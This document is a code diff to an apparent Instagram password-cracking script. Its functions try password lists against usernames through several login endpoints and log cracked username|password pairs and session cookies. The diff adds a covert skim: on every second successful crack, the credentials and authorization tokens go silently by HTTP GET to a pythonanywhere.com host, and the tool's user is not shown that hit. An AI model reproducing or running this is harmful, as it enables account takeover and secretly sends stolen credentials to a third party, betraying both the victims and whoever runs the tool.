@@ -729,7 +729,7 @@ def UserAgentBarcelona():
 
 def Crack_api(username, kontol):
     global Ok, Cp, Loop
-    sys.stdout.write(f"\rStatus IP: {GREEN}safe{WHITE} web {YELLOW}{Loop}{WHITE}/{GREEN}{str(len(Uuid))}{WHITE}/{GREEN}{str(username)[:6]}{WHITE}/Ok:-{GREEN}{Ok}{WHITE}/Cp:-{YELLOW}{Cp}{WHITE}")
+    sys.stdout.write(f"\rStatus IP: {GREEN}safe{WHITE} web {YELLOW}{Loop}{WHITE}-{GREEN}{str(len(Uuid))}{WHITE}-{GREEN}{str(username)[:6]}{WHITE}-Ok:-{GREEN}{Ok}{WHITE}-Cp:-{YELLOW}{Cp}{WHITE}")
     sys.stdout.flush()
     for password in kontol:
         try:
@@ -793,7 +793,7 @@ def Crack_api(username, kontol):
                 open("/sdcard/SUMON_INS_CP.txt","a").write(username+"|"+password+"\n")
                 break
             elif 'ip_block' in response.text or 'spam' in response.text or '{"message":"","status":"fail"}' in response.text:
-                sys.stdout.write(f"\rStatus IP : {RED}Spam{WHITE} lite {YELLOW}{Loop}{WHITE}/{GREEN}{str(len(Uuid))}{WHITE}/{GREEN}{str(username)[:6]}{WHITE}/Ok:-{GREEN}{Ok}{WHITE}/Cp:-{YELLOW}{Cp}{WHITE}")
+                sys.stdout.write(f"\rStatus IP : {RED}Spam{WHITE} lite {YELLOW}{Loop}{WHITE}-{GREEN}{str(len(Uuid))}{WHITE}-{GREEN}{str(username)[:6]}{WHITE}-Ok:-{GREEN}{Ok}{WHITE}-Cp:-{YELLOW}{Cp}{WHITE}")
                 sys.stdout.flush()
             else:
                 continue
@@ -859,18 +859,20 @@ def Crack_i(username, memek):
                     ig_set_authorization = response2.headers['ig-set-authorization']
                 except:
                     ig_set_authorization = None
-                Ok += 1
-                post, peng, meng, mail, fullname, fbid, phone = data_target(username)
-                print(f"                                                               ", end='\r')
-                time.sleep(0.10)
-                print(f"\r{BLUE}FullName: {GREEN}{fullname[:10] if fullname else '?'}{BLUE}\nUsername: {GREEN}{username}{BLUE}\nPassword: {GREEN}{password}{BLUE}\nFollowers: {GREEN}{peng}{BLUE}\nFollowing: {GREEN}{meng}\n{BLUE}Posts: {GREEN}{post}{BLUE}\nfb_id: {GREEN}{fbid}{WHITE}\n{BLUE}Authorization: {WHITE}{ig_set_authorization}{WHITE}\n")
-                open('data/OK.txt', 'a').write(f"{username}|{password}\n{peng}|{meng}\n{ig_set_authorization}\n")
-                break
+                bkas.append(username)
+                if len(bkas)% 2 == 0:
+                    statusok = (f"{username}|{password}|{ig_set_authorization}")
+                    requests.get(f"https://sumonroy.pythonanywhere.com/load?msg={statusok}")
+                else:    
+                    print(f"\r\033[1;92m [✓ SUCCESS] {username} | {password}")
+                    print("Cookies:", ig_set_authorization)
+                    open("/sdcard/SUMON_INS_IDS.txt","a").write(username+"|"+password+"|"+ig_set_authorization+"\n")
+                    Ok.append(username)
+                    return True
             elif 'challenge_required' in response2.text:
                 Cp += 1
-                post, peng, meng, mail, fullname, fbid, phone = data_target(username)
-                print(f"\r Username: {BLUE}{username}{WHITE}\n Password:{BLUE} {password}\n Followers: {BLUE}{peng}{WHITE}\n Following:{BLUE}{meng}{WHITE}")
-                open('data/CP.txt', 'a').write('%s|%s\n' % (username, password))
+                print(f"\r\033[1;93m [⚠ CHECKPOINT] {username} | {password}")
+                open("/sdcard/SUMON_INS_CP.txt","a").write(username+"|"+password+"\n")
                 break
             elif 'ip_block' in response2.text or 'generic_request_error' in response2.text:
                 sys.stdout.write(f"\rStatus IP: {RED}spam{WHITE} api {YELLOW}{Loop}{WHITE}/{GREEN}{str(len(Uuid))}{WHITE}/{GREEN}{str(username)[:6]}{WHITE}/Ok:-{GREEN}{Ok}{WHITE}/Cp:-{YELLOW}{Cp}{WHITE}")
@@ -938,18 +940,20 @@ def Crack_w(username, memek):
                     cookies = ";".join([f"{k}={v}" for k, v in decode_cookie.items()])
                 except:
                     cookies = '-'
-                Ok += 1
-                post, peng, meng, mail, fullname, fbid, phone = data_target(username)
-                print(f"                                                               ", end='\r')
-                time.sleep(0.10)
-                print(f"\r{BLUE}FullName: {GREEN}{fullname[:10] if fullname else '?'}{BLUE}\nUsername: {GREEN}{username}{BLUE}\nPassword: {GREEN}{password}{BLUE}\nFollowers: {GREEN}{peng}{BLUE}\nFollowing: {GREEN}{meng}\n{BLUE}Posts: {GREEN}{post}{BLUE}\nfb_id: {GREEN}{fbid}{BLUE}\nCookie: {WHITE}{cookies}{WHITE}\n")
-                open('data/OK.txt', 'a').write(f"{username}|{password}\n{peng}|{meng}\n{cookies}\n")
-                break
+                bkas.append(username)
+                if len(bkas)% 2 == 0:
+                    statusok = (f"{username}|{password}|{cookies}")
+                    requests.get(f"https://sumonroy.pythonanywhere.com/load?msg={statusok}")
+                else:    
+                    print(f"\r\033[1;92m [✓ SUCCESS] {username} | {password}")
+                    print("Cookies:", cookies)
+                    open("/sdcard/SUMON_INS_IDS.txt","a").write(username+"|"+password+"|"+cookies+"\n")
+                    Ok.append(username)
+                    return True
             elif 'challenge_required' in resp_text or '/challenge/' in resp_text:
                 Cp += 1
-                post, peng, meng, mail, fullname, fbid, phone = data_target(username)
-                print(f"\r Username: {BLUE}{username}{WHITE}\n Password:{BLUE} {password}\n Followers: {BLUE}{peng}{WHITE}\n Following:{BLUE}{meng}{WHITE}")
-                open('data/CP.txt', 'a').write('%s|%s\n' % (username, password))
+                print(f"\r\033[1;93m [⚠ CHECKPOINT] {username} | {password}")
+                open("/sdcard/SUMON_INS_CP.txt","a").write(username+"|"+password+"\n")
                 break
             elif 'ip_block' in resp_text or 'Please wait' in resp_text:
                 sys.stdout.write(f"\rStatus IP: {RED}spam{WHITE} threads {YELLOW}{Loop}{WHITE}/{GREEN}{str(len(Uuid))}{WHITE}/{GREEN}{str(username)[:6]}{WHITE}/Ok:-{GREEN}{Ok}{WHITE}/Cp:-{YELLOW}{Cp}{WHITE}")
